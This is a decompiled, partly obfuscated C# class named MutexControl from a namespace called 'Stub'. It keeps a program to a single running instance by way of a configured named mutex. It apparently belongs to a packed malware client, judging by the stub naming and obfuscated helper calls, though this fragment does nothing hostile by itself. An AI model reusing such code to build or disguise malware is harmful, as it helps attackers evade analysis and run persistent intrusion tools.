using System;
using System.Threading;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x02000096 RID: 150
	internal sealed class MutexControl
	{
		// Token: 0x060001C8 RID: 456 RVA: 0x00014704 File Offset: 0x00012904
		public static void Check()
		{
			try
			{
				bool flag;
				MutexControl._mutex = new Mutex(true, Config.Mutex, out flag);
				if (!flag)
				{
					Environment.Exit(0);
				}
			}
			catch (Exception ex)
			{
				Logging.Log("MutexControl: Failed to check mutex. Error: " + ex.Message, true);
				Environment.Exit(0);
			}
		}

		// Token: 0x060001C9 RID: 457 RVA: 0x000038B4 File Offset: 0x00001AB4
		public MutexControl()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x060001CA RID: 458 RVA: 0x000038AD File Offset: 0x00001AAD
		static MutexControl()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		}

		// Token: 0x040004E0 RID: 1248
		private static Mutex _mutex;
	}
}
